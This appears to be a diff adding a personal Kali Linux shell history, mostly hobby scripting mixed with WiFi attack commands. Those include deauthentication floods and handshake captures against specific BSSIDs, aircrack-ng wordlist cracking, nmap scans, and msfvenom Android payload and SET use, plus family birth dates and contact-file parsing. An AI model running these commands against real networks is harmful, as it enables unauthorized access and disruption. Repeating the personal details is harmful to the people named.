@@ -1,0 +1,2001 @@
+fuser -cu /home
+history
+dir backup
+dir /home/backup/
+dir
+history > /home/backup/history.mount.iso
+xdg-open /home/backup/
+cd /home/backup/
+didr
+mv history.mount.iso history-mount-iso
+cat history-mount-iso 
+mv history-mount-iso mount-iso-history
+mount /home/ /root/Desktop/
+mkdir home
+mount /home/ /root/Desktop/home/
+doesitfeel
+cd /home/localhost/
+dir
+nano index.html 
+showfigfonts
+apt-get install toilet
+apt-get update
+figlet -f script "HelloWorld"
+figlet -f shadow "HelloWorld"
+history
+ln -s /home/backup/history-cmd/ /root/
+dir
+mv history-cmd history
+dir
+history >history/history-showfigfonts
+cd history
+dir
+mv history-showfigfonts showfigfonts-history
+dir
+exit
+history
+exit
+ln -s /media/root/Stephanware1/videos/music/PETER_RABBIT_-_Official_Trailer_#2.mp4 /root/localhost
+ls -n
+ls -n 
+chmod 
+chmod --h
+ls -n
+ln -s /home/localhost/ /root/
+cd localhost
+didr
+dir
+nano index.html
+ls
+nano index.html
+touch hscript.sh
+touch index.html
+bluefish index.html 
+bluefish
+cd /var/www/html/
+dir
+touch mrrobotserver.sh
+nano mrrobotserver.sh 
+nano index.html 
+nano mrrobotserver.sh 
+chmod +x mrrobotserver.sh 
+sh mrrobotserver.sh 
+dir
+exit
+nano index.html 
+exit
+cd /var/www/html
+dir
+cp *.html /home/localhost/apache2server/
+mv --h
+mv -f *.html /home/localhost/apache2server/
+dir
+cd ..
+mount -B /home/localhost/ /var/www/html/
+cd html/
+dir
+cd apache2server/
+dir
+netstat -nap | grep apache2 | more
+systemclf start apache2.service
+systemctl start apache2.service
+netstat -nap | grep apache2 | more
+ifconfig
+history
+umount /home/localhost 
+umount /var/www/html 
+fuser -cu /var/www/html
+kill 3877
+umount /var/www/html 
+umount /home/localhost 
+fuser -cu /home/localhost/
+kill 3799c
+kill 3799
+kill 11602
+umount /home/localhost 
+cd localhost/
+dir
+cd 
+mount /home/picture/ /root/Pictures/
+unmount /root/Pictures/
+mount --h
+umount -l /root/Pictures
+mount
+df command
+df
+mount -B /home/picture/ /root/Pictures/
+cat /etc/fstab
+ln -s /home/ /root/demiguise/
+ln -s /home/ /root/Desktop/
+history
+ls
+ln -s /home/ /root/
+dir
+cd home
+dir
+cd ..
+cd
+dir script
+ln -s /home/script/ /root/
+cd script
+ls
+touch mountall.sh
+ls -n
+ls
+rm "wlan0mon.sh'"
+ls
+cat wifiadb.sh 
+ls -n
+nano mount
+nano mount.sh
+rm mountall.sh
+mv mount.sh mountall.sh
+nano mountall.sh 
+cd /media/root/
+dir
+cd Stephanware/
+dir
+eix
+t
+eix
+te
+exit
+cd script
+dir
+ls -n
+hscript
+nano /root/.bashrc
+mountall
+nano mountall.sh 
+ps
+ls -p
+ps -l
+ps
+figlet -f banner "hscript"
+figlet -f digital "hscript"
+figlet -f mini "hscript"
+figlet -f script "hscript"
+showfigfonts
+nano /root/.bashrc
+adb
+wifiadb
+hs
+su
+hs
+sus
+su
+su
+sh colourfulText.sh 
+nano colourfulText.sh 
+sh commandhistory/
+touch colorTEXT.sh
+l
+sh colourfulText.sh 
+echo "$(tput setaf 6) hi"
+echo "$(tput setaf 1) hi"
+cd script
+didr
+ls
+cd adb-sh/
+ls
+mv adbwifi.sh wifiadb.sh
+ls
+cd ..
+ls
+nano hscript.sh 
+sh hscript.sh 
+touch colorTEXT.sh
+nano colorTEXT.sh 
+chmod +x colorTEXT.sh 
+sh colorTEXT.sh 
+figlet -f shadow "$(tput setaf 1) Hello"
+figlet -f shadow | echo "$(tput setaf 1) Hello"
+echo "$(tput setaf 1) Hello" | figlet 
+echo "$(tput setaf 1) Hello" 
+touch /home/bash
+nano /home/bash
+cd /home/
+dir
+cat bash 
+cd script/
+dir
+ls
+ls -n
+chmod +x hscript.sh 
+ls -n
+nano hscript.sh 
+cd 
+nano /root/.bashrc
+nano /home/script/hscript.sh 
+figlet "Wifi Hack"
+figlet "Wifi Hacking"
+exit
+hs
+l
+websploit
+cd sc
+cd script
+dir
+touch wifihack.sh
+nano wifihack.sh 
+ls
+hwifif
+hwifi
+hs
+wifi
+cd
+wifi
+ls -n
+cd script
+ls -n
+chmod +x wifihack.sh 
+wifi
+hs
+clear
+hs
+clear
+hs
+cd home
+dir
+ls
+cd script/
+dir
+chmod +x wifihack.sh 
+nano /root/.bashrc
+wifihack
+nano /root/.bashrc
+wifi
+hs
+nano wifihack.sh 
+wifi
+ls
+cat wlan0mon.sh 
+ls
+hs
+nano hscript.sh
+nano /root/.bashrc
+cd script
+dir
+ls
+mkdir wificrack
+ls
+cd wificrack/
+dir
+touch wlan0mon.sh
+touch airodump-ng-wlan0mon.sh
+touch airodump-ng-capture.sh
+touch airmon-ng-stop.sh
+ls
+mkdir caps
+ls
+mv caps cap
+lsl
+ls
+aireplay -0 0 -a 12:FA:CE:91:1D:88 wlan0mon
+aireplay-ng -0 0 -a 12:FA:CE:91:1D:88 wlan0mon
+clear
+ls
+cd cap/
+dir
+cd..
+cd ..
+diri
+ls
+touch aireplay-ng.sh
+ls
+aireplay-ng.sh
+nano aireplay-ng.sh 
+ls
+nano airodump-ng-capture.sh 
+ls
+nano airodump-ng-capture.sh 
+sh airodump-ng-caputure.sh
+ls
+nano airodump-ng-capture.sh 
+sh airodump-ng-capture.sh
+nano airodump-ng-capture.sh 
+clear
+sh airodump-ng-capture.sh
+cd script
+dir
+wifif
+wifi
+nano wifihack.sh 
+cd wificrack/
+dir
+nano airodump-ng-capture.sh 
+chmod +x airodump-ng-capture.sh 
+ls
+sh airodump-ng-capture.sh 
+nano airodump-ng-capture.sh 
+sh airodump-ng-capture.sh 
+cd cap
+dir
+rm *.*
+diir
+dir
+ls
+cd ..
+chmod +x aireplay-ng.sh 
+nano aireplay-ng.sh 
+iwconfi
+iwconfig
+airmon-ng start wlan0
+
+airodump-ng wlan0mon
+mkdir capture
+airodump-ng --bssid 40:C8:CB:19:0F:07 -c 6 --write /root/capture/cap-wpa wlan0mon
+airmon-ng stop 
+airmon-ng stop wlan0
+ifconfig
+airodump-ng stop
+airodump-ng stop wlan0moon
+airodump-ng stop wlan0mon
+airmon-ng stop wlan0mon
+iwconfig
+iwconfig
+airodump-ng wlan0mon
+aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 wlan0mon
+cd script
+dir
+sh wifi
+sh wifihack.sh 
+aircrack -w /home/wordlist/password.txt -b 40:C8:CB:19:0F:07 /root/capture/cap-wpa-01.cap 
+aircrack-ng -w /home/wordlist/password.txt -b 40:C8:CB:19:0F:07 /root/capture/cap-wpa-01.cap 
+aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 wlan0mon
+cd capture/
+dir
+rm *.*
+dir
+exit
+airodump-ng stop wlan0mon
+airmon-ng stop wlan0mon
+airmon-ng start wlan0
+airmon-ng check kill
+airodump-ng --bssid 12:FA:CE:91:1D:88 -c 6 --write /root/capture/cap-wpa wlan0mon
+airodump-ng wlan0mon
+aireplay -0 0 -a 12:FA:CE:91:1D:88 wlan0mon
+aireplay-ng -0 0 -a 12:FA:CE:91:1D:88 wlan0mon
+aireplay-ng -0 0 -a 12:FA:CE:91:1D:88 -c 6 wlan0mon
+aireplay-ng -0 0 -a 12:FA:CE:91:1D:88  wlan0mon
+nano /root/.bashrc
+jiofi
+nano /root/.bashrc
+cd script
+dir
+ls
+cd capture/
+dir
+ls
+rm *.*
+airodump-ng --bssid 40:C8:CB:19:0F:07 -c 7 --write /root/capture/cap-wpa wlan0mon
+aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 wlan0mon
+aireplay --deauth 10 -a 40:C8:CB:19:0F:07
+aireplay-ng --deauth 10 -a 40:C8:CB:19:0F:07 wlan0mon
+aireplay-ng --deauth 0 -a 40:C8:CB:19:0F:07 wlan0mon
+ifconfig
+airodump-ng wlan0mon
+cd home
+dir
+cd wordlist/
+dir
+exit
+nano script/wificrack/airodump-ng-capture.sh 
+exit
+sh script/wificrack/aircrack-ng.sh 
+nano script/wificrack/aircrack-ng.sh 
+sh script/wificrack/aircrack-ng.sh 
+nano script/wificrack/aircrack-ng.sh 
+sh script/wificrack/aircrack-ng.sh 
+cd script
+dir
+ls
+nano wifihack.sh 
+cd wificrack/
+dir
+nano aireplay-ng.sh 
+nano airodump-ng-capture.sh 
+ls
+nano airodump-ng-wlan0mon.sh 
+nano airodump-ng-capture.sh 
+cd cap/
+dir
+echo "40:C8:CB:19:0F:07" > bssid
+ls
+cat bssid 
+aireplay -0 0 -a bssid wlan0mon
+aireplay-ng -0 0 -a bssid wlan0mon
+aireplay-ng -0 0 -a cat bssid wlan0mon
+cd ..
+ls
+aireplay-ng 
+
+nano airodump-ng-capture.sh 
+lsl
+ls
+touch aircrack-ng.sh
+chmod +x aircrack-ng.sh 
+nano aircrack-ng.sh 
+ls
+xterm echo "hi"
+clear
+sh airodump-ng-capture.sh 
+nano airodump-ng-capture.sh 
+sh airodump-ng-capture.sh 
+sh script/wificrack/aireplay-ng.sh 
+airodump-ng --bssid 40:C8:CB:19:0F:07 -c 7 --write /root/capture/cap-wpa wlan0mon
+mountall
+cd capture/
+dir
+cat cap-wpa-01.kismet.netxml 
+rm *.*
+airmon-ng start wlan0
+airodump-ng wlan0mon
+aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 wlan0mon
+cat keyfound.txt 
+exit
+cd ..
+sh aircrack-ng.sh 
+sh airodump-ng-wlan0mon.sh 
+sh airodump-ng-capture.sh 
+cd script/wificrack/
+ls
+sh aircrack-ng.sh 
+cd world/
+dir
+cat keyfound.txt 
+cd ..
+nano wifihack.sh 
+aircrack-ng -w /home/wordlist/password.txt -b 40:C8:CB:19:0F:07 /root/capture/cap-wpa-01.cap wlan0mon
+aircrack-ng -w /home/wordlist/password.txt -b 40:C8:CB:19:0F:07 /root/capture/cap-wpa-01.cap
+aircrack-ng -w /home/wordlist/password.txt -b 40:C8:CB:19:0F:07 /root/capture/cap-wpa-01.cap > cracked.txt
+cat cracked.txt 
+cd script
+cd wificrack/
+sh airodump-ng-wlan0mon.sh 
+cd capture/
+dir
+sh wificrack/aircrack-ng.sh 
+ln -s /home/script/wificrack/
+cd wificrack
+sh airodump-ng-wlan0mon.sh 
+sh airodump-ng-capture.sh 
+sh wificrack/aireplay-ng.sh 
+exit
+figlet "airmon-ng start wlan0"
+figlet "Monitor Mode"
+figlet "Monitor Mode:ON"
+figlet "MonitorMode:ON"
+figlet "MonitorMode"
+figlet "Monitor Mode"
+figlet "wifi crack
+figlet "wifi crack"
+figlet "wifi handshake"
+figlet "wifihandshake"
+figlet "wifi capture"
+figlet "wifiHandshake"
+figlet "wifi crack"
+figlet "wifi monitor"
+figlet "capturing
+
+figlet "capturing"]
+figlet "capturing"
+figlet "capturing wifi"
+echo "airodump-ng --bssid $(tput setaf 1) (bssid) -c $(tput setaf 1) (channel) --write $(tput setaf 1) (cap-dir) $(tput setaf 2) wlan0mon"
+echo "airodump-ng --bssid $(tput setaf 1) (bssid) $(tput setaf 7) -c $(tput setaf 1) (channel) $(tput setaf 7) --write $(tput setaf 1) (cap-dir) $(tp$
+
+echo "airodump-ng --bssid $(tput setaf 1) (bssid) $(tput setaf 7) -c $(tput setaf 1) (channel) $(tput setaf 7) --write $(tput setaf 1) (cap-dir) 
+echo "airodump-ng --bssid $(tput setaf 1) (bssid) $(tput setaf 7) -c $(tput setaf 1) (channel) $(tput setaf 7) --write $(tput setaf 1) (cap-dir) "
+echo "airodump-ng --bssid $(tput setaf 1) (bssid) $(tput setaf 7) -c $(tput setaf 1) (channel) $(tput setaf 7) --write $(tput setaf 1) (cap-dir) $(tput setaf 2) wlan0mon "
+exit
+cd home
+cd wordlist/
+less password.txt 
+cd ..
+cd script/wificrack/
+sh aireplay-ng.sh 
+figlet "hack wifi"
+exit
+figlet "hacking wifi
+figlet "hacking wifi"
+exit
+showfigfonts
+figlet -f digital "wifimonitor" && echo "wifi "
+exit
+figlete -f digital "wifi monitor . sh"
+figlete -f" digital "wifi monitor . sh"
+figlete -f " digital "wifi monitor . sh"
+figlete -f digital "wifi monitor . sh"
+figlet -f digital "wifi monitor . sh"
+exit
+cd script/txt/
+didr
+dir
+touch hackwifi
+nano hackwifi 
+mv hackwifi hackwifi.sh
+nano hackwifi.sh 
+ls
+chmod +x hackwifi.sh 
+sh hackwifi.sh 
+nano hackwifi.sh 
+sh hackwifi.sh 
+nano hackwifi.sh 
+sh hackwifi.sh 
+nano hackwifi.sh 
+sh hackwifi.sh 
+nano hackwifi.sh 
+sh hackwifi.sh 
+sh hackwifi.sh
+nano hackwifi.sh 
+sh hackwifi.sh
+nano hackwifi.sh 
+sh hackwifi.sh
+wifimonitor
+hackwifi
+cd ..
+cd wificrack/
+rm hackwifi.sh 
+cd ..
+cd txt/
+mv hackwifi.sh /home/script/wificrack/
+cd ..
+cd wificrack/
+ls
+sh hackwifi.sh 
+hackwifi
+nano hackwifi.sh 
+hackwifi
+nano /root/.bashrc
+figlet -f digital "wifi handshare"
+figlet -f digital "wifi crack"
+figlet -f digital "wifi handshake"
+figlet -f mini "alias"
+figlet -f digital "alias"
+cd script/wificrack/
+nano wifimonitor.sh 
+nano wificapture.sh 
+nano wifihandshake.sh 
+nano wificrack.sh 
+cd ..
+sh colorTEXT.sh 
+cd script
+cd wificrack/
+dir
+ls
+cat wifimonitor.sh 
+chmod +x monitormode.sh 
+ls
+cat monitormode.sh 
+touch hackwifi.sh
+chmod +x hackwifi.sh 
+nano hackwifi.sh 
+lss
+ls
+sh hackwifi.sh 
+ls
+nano hackwifi.sh 
+sh hackwifi.sh 
+nano hackwifi.sh 
+sh hackwifi.sh 
+nano hackwifi.sh 
+sh hackwifi.sh 
+nano hackwifi.sh 
+sh hackwifi.sh 
+nano hackwifi.sh 
+sh hackwifi.sh 
+figlet -f mini "wifi monitor"
+cd script/wificrack/
+nano hackwifi.sh 
+cd script
+sh colorTEXT.sh 
+cd wificrack
+dir
+ls
+mv airodump-ng-capture.sh wificapture.sh
+ls
+mv aircrack-ng.sh wificrack.sh
+ls
+mv aireplay-ng.sh wifihandshake.sh
+ls
+mv airodump-ng-wlan0mon.sh wifimonitor.sh
+ls
+cat wlan0mon.sh 
+cat wifimonitor.sh 
+mv wlan0mon.sh monitormode.sh
+cat monitormode.sh 
+nano monitormode.sh 
+ls
+chmod +x wifimonitor.sh 
+ls
+nano wifihandshake.sh 
+nano wificrack.sh 
+nano wificapture.sh 
+nano wifimonitor.sh 
+nano wificapture.sh 
+sh wificapture.sh 
+nano wificapture.sh 
+sh wificapture.sh 
+nano wificapture.sh 
+sh wificapture.sh 
+nano wificapture.sh 
+sh wificapture.sh 
+sh wifihandshake.sh 
+nano wificapture.sh 
+sh wificapture.sh 
+nano wificapture.sh 
+sh wificapture.sh 
+nano wificapture.sh 
+sh wificapture.sh 
+nano wificapture.sh 
+sh wificapture.sh 
+nano wificapture.sh 
+sh wificapture.sh 
+nano wificapture.sh 
+sh wificapture.sh 
+nano wificapture.sh 
+sh wificapture.sh 
+nano wificapture.sh 
+sh wificapture.sh 
+nano wificapture.sh 
+lss
+ls
+sh wificrack.sh 
+nano wificrack.sh 
+sh wificrack.sh 
+nano wificrack.sh 
+sh wificrack.sh 
+nano wificrack.sh 
+sh wificrack.sh 
+ls
+sh wifihandshake.sh 
+nano wifihandshake.sh 
+nano wificapture.sh 
+sh wificapture.sh 
+nano wificapture.sh 
+echo "airodump-ng --bssid $(tput setaf 1) (bssid) $(tput setaf 7) -c $(tput setaf 1) (channel) $(tput setaf 7) --write $(tput setaf 1) (cap-dir) 
+$(tput setaf 2) wlan0mon"echo "airodump-ng --bssid $(tput setaf 1) (bssid) $(tput setaf 7) -c $(tput setaf 1) (channel) $(tput setaf 7) --write $(tput setaf 1) (cap-dir) 
+cd script
+sh colorTEXT.sh 
+nano colorTEXT.sh 
+sh colorTEXT.sh 
+nano colorTEXT.sh 
+sh colorTEXT.sh 
+nano colorTEXT.sh 
+sh colorTEXT.sh 
+nano colorTEXT.sh 
+sh colorTEXT.sh 
+nano colorTEXT.sh 
+sh colorTEXT.sh 
+nano colorTEXT.sh 
+sh colorTEXT.sh 
+hackwifi
+ln -s /home/wordlist/password.txt  /root/
+ls
+ls -n
+cat password.txt 
+wificapture
+wificapture
+nano wificrack/wificapture.sh
+wificapture
+cd wificrack
+ls
+cad cap/
+cd cap/
+dir
+cd..
+cd ..
+ls
+cd hello
+lss
+ls
+clear
+wificapture
+cd .
+cd ...
+cd ..
+lsl
+ls
+mv cap capture
+ls
+rm -r hello
+rm -r helloworld/
+rm -r world/
+ls
+rm -r fd
+ls
+nano wificrack/wificapture.sh
+cd wificrack
+l
+ls
+wificapture
+nano wificrack/wificapture.sh
+nano /root/.bashrc
+wifihandshake
+wificapture
+clear
+wificap
+iwconfi
+iwconfig
+wifimonitor
+wificrack
+jiofi
+wificrack
+nano wificrack/wificrack.sh 
+mountall
+airmon-ng start wlan0
+wifimonitor
+hackwifi
+wificap
+wifihshake
+wifihshak40:C8:CB:19:0F:07
+wifihshake
+wifimonitor
+wificrack
+wificapture
+wificap
+cd wificrack/capture/hworld/
+ls
+cat keyfound.txt 
+cd ..
+dir
+cd ..
+dir
+cd capture/
+dir
+cd helloworld/
+ls
+cat keyfound.txt 
+wificrack
+airmon-ng stop wlan0mon
+ifconfig
+eixt
+route -a
+route -n
+nmap -T4 -vv -A 192.168.43.1
+netdiscover
+wifimonitor
+nmap -T4 -vv -A 192.168.43.67
+cd wificrack/capture/hworld/
+ls
+cat keyfound.txt 
+cd wificrack
+dir
+ls
+hackwifif
+hackwifi
+cat hackwifi.sh 
+nano hackwifi.sh 
+ls
+cat wificapture.sh
+nano wifimonitor.sh 
+nano wificapture.sh
+ifconfig
+airmon-ng start wlan0
+wifite
+wifihshake
+wificap
+wifihshake
+wificap
+wifihshake
+aireplay-ng -0 0 -a 40:C8:CB:19:0F:07  -c 8 wlan0mon
+aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 -c 8 wlan0mon
+aireplay-ng -0 0 -a 40:C8:CB:19:0F:07  wlan0mon
+aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 -c 8 wlan0mon
+aireplay-ng -0 0 -a 40:C8:CB:19:0F:07  wlan0mon
+aireplay-ng -0 0 -a 40:C8:CB:19:0F:07 -c 8 wlan0mon
+aireplay-ng -0 0 -a 40:C8:CB:19:0F:07  wlan0mon
+airmon-ng check kill
+wifite
+airmon-ng stop wlan0
+airmon-ng stop wlan0mon
+ifconfig
+ifconfig wlan0 up
+ifconfig
+iwconfig
+mountall
+wificrack
+ifconfig
+airmon-ng start wlan0
+wifimonitor
+hackwifi
+clear
+wificap
+wifihshake
+exit
+nano wificrack/hackwifi.sh 
+hackwifi
+nano wificrack/hackwifi.sh 
+hackwifi
+nano wificrack/hackwifi.sh 
+hackwifi
+nano wificrack/hackwifi.sh 
+hackwifi
+nano wificrack/hackwifi.sh 
+hackwifi
+nano wificrack/hackwifi.sh 
+hackwifi
+nano wificrack/hackwifi.sh 
+hackwifi
+nano wificrack/hackwifi.sh 
+hackwifi
+nano wificrack/hackwifi.sh 
+hackwifi
+nano wificrack/hackwifi.sh 
+cd wificrack
+ls
+cd ..
+cd script
+ls
+cd wificrack/
+ls
+touch wifi
+mv wifi hwifi
+nano hwifi 
+nano hackwifi.sh 
+hackwifi
+nano hackwifi.sh 
+wifite
+wificrack
+wificap
+hackwifi
+nano wificrack/hackwifi.sh 
+hackwifi
+cd wifi
+cd wificrack
+ls
+cat hwifi 
+nano hackwifi.sh 
+cat hwifi 
+hackwifi
+nano hwifi 
+hackwifi
+nano hwifi 
+hackwifi
+nano hwifi 
+hackwifi
+airmon-ng stop wlan0mon
+ifconfig
+cler
+clear
+adb devices
+cd /media/root/
+dir
+cd GhostDrive/
+dir
+cd StephanWarePC/
+cd App-Source-codes/
+cd ..
+ls
+dir
+cd APK
+lsl
+ls
+dir | grep jio
+adb devices
+adb install com.jio.myjio-1.apk 
+adb shel
+adb shell
+adb devices
+adb shell
+cd /media/root/GhostDrive/StephanWarePC/APK/
+LS
+dir | grep jio
+adb push com.jio.myjio-1.apk /storage/self/primary/Apps
+adb push com.jio.join-1.apk /storage/self/primary/Apps
+adb shell installcom.jio.myjio-1.apk
+adb install com.jio.myjio-1.apk 
+ls
+adb push WhatsApp-com.whatsapp-2.17.190-451818.apk /storage/self/primary/Apps 
+mountall
+cd /home/wordlist/
+ls
+less password.txt 
+cat password.txt 
+echo "password" >> password.txt 
+cat password.txt 
+aircrack
+wificrack
+ls
+nano password.txt 
+wificrack
+wificrack
+hackwifi
+airmon-ng start wlan0
+wifimonitor
+wificap
+wifihshake
+ls -n
+ln -s /home/wificrack/capture /root
+ls
+ls -n
+ln -s /home/script/wificrack/capture/ /root/
+rm capture
+ls
+ls -n
+ln -s /home/script/wificrack/capture/ /root/
+ls
+cd capture
+ls
+rm *.*
+ls
+rm bssid
+ls
+cd redmi/
+ls
+cat keyfound.txt 
+cd ..
+cd Redmi/
+ls
+cat keyfound.txt 
+cd ..
+cd helloworld/
+ls
+cat keyfound.txt 
+cd ..
+ls
+wificrack
+wifimonitor
+airmon-ng stop wlan0
+airmon-ng stop wlan0mon
+ifconfig
+ifconfig wlan0 up
+ifconfig
+cd capture/redmi/
+cat keyfound.txt 
+wifihshake
+wificap
+mountall
+cd capture/redmi/
+cat keyfound.txt 
+cd Downloads/
+lsls
+ls
+adb devices
+adb shell
+cd /home/
+ls
+mkdir personal
+cd personal/
+touch mydob
+echo "Father's DOB-7 April 1961"> mydob
+ls
+cat mydob 
+echo "Mother's DOB - 11 June 1970" > mydob 
+echo "Father's DOB-7 April 1961" >> mydob 
+cat mydob 
+echo "Sanju's DOB - 18 June 1997 " >> mydob 
+cat mydob 
+wifiadb
+adb shell
+xdg-open /Stephanware/videos/music/Charlie_Puth_-_Does_It_Feel_\[Official_Audio\].mp4 
+l
+hackwifi
+nano wificrack/wificapture.sh
+ls
+ls -n
+xdg-open /root/.set/reports/qrcode_attack.png
+setoolkit
+ifconfig
+ls
+ifconfig
+systemctl restart apache2.service
+cd script
+ls
+mkdir apache2
+cd apache2/
+cd ..
+cat start-server.sh 
+mv start-server.sh apache2/
+cd apache2/
+ls
+nano /root/wificrack/wificapture.sh
+cd html
+ls
+cat index.html
+eix
+exi
+exit
+sh SuperUser@10.42.0.1
+ssh SuperUser@10.42.0.1
+ifconfig
+ping 10.42.0.1
+nmap -T4 -vv -A 10.42.0.1
+figlet "Kali Linux "
+figlet "Videos"
+touch index.html
+touch webserver.sh
+exit
+figlet "webserver"
+nano webserver.sh 
+chmod +x webserver.sh 
+sh webserver.sh 
+exit
+nano webserver.sh 
+netstat -nap | grep apache2 | more
+cd /media/root/Stephanware/
+echo "netstat -nap | grep apache2 | more " >> webserver.sh 
+nano webserver.sh 
+sh webserver.sh 
+nano webserver.sh 
+sh webserver.sh 
+nano webserver.sh 
+sh webserver.sh 
+ifconfig
+ifconfig | grep wlan0
+ifconfig | grep wlan0 | grep inet
+ifconfig | grep wlan0 && grep inet
+ifconfig |  grep inet
+ifconfig eth0 down
+ifconfig lo down
+ifconfig |  grep inet
+nano webserver.sh 
+sh we
+sh webserver.sh 
+ifconfig
+sh webserver.sh 
+nano webserver.sh 
+sh webserver.sh 
+nano webserver.sh 
+sh webserver.sh 
+nano webserver.sh 
+cd home
+cd python/
+ls
+cd PythonProjects/
+ls
+py helloworld.py 
+chmod +x helloworld.py 
+./helloworld.py 
+cd localhost
+ls -n
+bluefish index.html
+cd /media/root/
+di
+lsl
+ls
+eix
+eixt
+hackwifi
+ls -n
+mountall
+ifconfifg
+ifconfig
+arimon-ng start wlan0
+airmon-ng start wlan0
+airmon-ng wlan0
+airodump-ng wlan0mon
+cd /home/
+ls
+mv payloads payload
+ls
+exit
+figlet "msfvenom"
+figlet "msfvenom apk"
+figlet "msfvenom"
+figlet "venom apk"
+figlet "venom.apk
+figlet "venom.apk"
+figlet "venom . apk"
+figlet "venom.apk"
+figlet "venom . apk" 
+figlet "venom. apk" 
+figlet "venom..apk" 
+ifconfig
+figlet "AndroidHack" >> apk/AndroidHack.txt 
+cat apk/AndroidHack.txt 
+sh apk/venom.sh
+cd apk
+ls -n
+cd apk
+rm apk
+l
+ln -s /home/payload/apk
+ls -n
+cd apk/
+ls -n
+cd 
+sh apk/venom.sh 
+cd apk
+ls
+cat AndroidHack.txt 
+nano venom.sh 
+sh venom.sh 
+nano venom.sh 
+sh venom.sh 
+leafpad HackAndroid.txt 
+ls -n
+rm *.txt
+ls
+clear
+sh venom.sh 
+findsploit payload | grep androi
+findsploit payload | grep android
+findsploit payload android
+findsploit --h
+cd /home
+dir
+ls
+ls -n
+mkdir payloads
+cd python/
+ls
+cd ..
+cd payloads/
+lsl
+ls
+mkdir apk
+ln -s /home/payloads/apk /root/
+cd 
+cd apk/
+dir
+touch venom.sh
+ls -n
+chmod +x venom.sh 
+ls -n
+nano venom.sh 
+rm AndroidHack.txt 
+lss
+lsl
+ls
+sh venom.sh 
+nano venom.sh 
+dir apk
+rm apk/AndroidHack.txt 
+eix
+exit
+sh apk/venom.sh 
+dir apk
+airmon-ng stop wlan0mon
+ifconfig
+exit
+wificapture
+wificap
+hotspot
+nm-connection-editor
+cd script
+ls
+ls -n
+touch hotspot.sh
+figlet hotspot.sh 
+figlet "starting hotspot"
+figlet "starting  hotspot"
+figlet "hotspot"
+figlet "hotspot : ON"
+nano hotspot.sh"
+nano hotspot.sh
+chmod +x hotspot.sh 
+sh hotspot.sh 
+nano /root/.bashrc
+hotspot
+nano /root/.bashrc
+ls -n
+ls -n /home/script/txt/allCommand /root/
+ls -n /home/script/txt/apt /root/
+ln -s /home/script/txt/bash /root/
+touch bash/bash02
+nano bash/bash02
+cat cmd
+cd /home/script/txt/
+ls -n
+cat cmd
+ln -s /home/script/txt/cmd /root/
+cd 
+ls -n
+cd /home/script/txt/
+ls
+ls -n
+cat alias-help 
+cat bash 
+mkdir bash
+ls -n
+cd bash
+mv bash bash01
+mkdir bash
+mv bash01 bash
+cd bash/
+ls
+nano /root/.bashrc
+ls -n
+airodump wla0mon
+airodump-ng wlan0mon
+cat cmd
+wifihshake
+xdg-open https://pycharm.org
+ifconfig
+airmon-ng start wlan0
+iwconfig
+dir capture
+wificap
+wificrack
+airmon-ng stop wlan0mon
+dir history
+history history/nm-connection-editor-history
+history > history/nm-connection-editor-history
+dir history
+dir apk
+dir script
+echo "nm-connection-editor  Turn Hotspot On" >> cmd 
+cat cmd 
+nm-connection-editor
+python
+cler
+clear
+airodump-ng wlan0mon
+history
+ping google.com
+mountall
+exit
+dir Downloads/
+exit
+python
+apt-get install toilet
+toilet -f smblock --filter metal "Stephan"
+toilet -f smblock --filter metal "Sanjeev Stephan Murmu"
+apt-get install fortune
+apt-get update
+sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 6494C6D6997C215E
+apt-get update
+apt-get update
+fortune | cowsay | toilet --metal -f term
+apt-get install cowsay
+fortune | cowsay | toilet --metal -f term
+cd script
+touch toilet.sh
+nano toilet.sh 
+chmod +x toilet.sh 
+sh toilet.sh 
+nano toilet.sh 
+sh toilet.sh 
+nano toilet.sh 
+sh toilet.sh 
+figlet -f smblock "Stephan"
+figlet -f smblock "Mr.Stephan"
+figlet -f smblock "Mr . Stephan"
+figlet -f smblock --filter border:metal "Mr . Stephan"
+figlet -f smblock --filter metal "Mr . Stephan"
+toilet -f smblock --filter metal "Mr . Stephan"
+toilet -f smblock --filter border: metal "Mr . Stephan"
+toilet -f smblock --filter border:metal "Mr . Stephan"
+toilet -f smblock --filter border:metal -w 10 "Mr . Stephan"
+toilet -f smblock --filter border:metal -w 100 "Mr . Stephan"
+toilet -f smblock --filter border:metal -w 1000 "Mr . Stephan"
+apt-get install fortune
+fortune | cowsay -f eyes | toilet --metal -f term
+apt-get install cowsay
+toilet -f smblock "hello"
+toilet "hi"
+toilet --h
+toilet
+toilet "hieello"
+toilet -f big "hie"
+toilet -f digital "Hello"
+toilet "Sanjeev"
+mountall
+fortune "hi"
+exit
+cd /media/root/
+ls -n
+dir
+cd Doq
+cd Dow
+cd Downloads/
+ls
+ls -n
+tar -zxvf pycharm-community-2018.1.4.tar.gz 
+cd pycharm-community-2018.1.4/
+ls
+cd bin/
+ls
+ls -n
+./pycharm.sh 
+cd home
+ls
+cd PycharmProjects/
+ls
+chmod +x HelloWorld.py 
+ls
+./HelloWorld.py 
+cat VC
+cat VCARD_20180601_201319.vcf 
+cat VCARD_20180601_201319.vcf | grep 9631662655
+cat VCARD_20180601_201319.vcf | grep CELL | grep ENCODING=QUOTED-PRINTABLE
+cat VCARD_20180601_201319.vcf | grep CELL 
+cat VCARD_20180601_201319.vcf  grep ENCODING=QUOTED-PRINTABLE
+cat VCARD_20180601_201319.vcf |  grep ENCODING=QUOTED-PRINTABLE
+cat VCARD_20180601_201319.vcf |  grep QUOTED-PRINTABLE  
+cat VCARD_20180601_201319.vcf |  grep QUOTED-PRINTABLE  > contact_names
+cat VCARD_20180601_201319.vcf |  grep CELL
+cat VCARD_20180601_201319.vcf |  grep CELL > contact_numbers
+cat contact_numbers 
+cat names
+ls
+cat contact_names 
+mkdir /home/contact
+cp /media/root/48C0-6FD1/vCard/ /home/contact/
+cp /media/root/48C0-6FD1/vCard/VCARD_20180601_201319.vcf /home/contact/
+ls
+cd home/contact/
+ls
+cat VCARD_20180601_201319.vcf 
+cd /media/root/
+ls
+cd disk/
+ls
+cd vCard/
+ls
+cd ..
+cat VCARD_20180601_201032.vcf 
+cd ..
+ls
+cd 48C0-6FD1/
+ls
+cd vCard/
+ls
+cat VCARD_20180601_201319.vcf 
+cd /media/root/
+ls
+cd /media/root/Stephanware/APK/
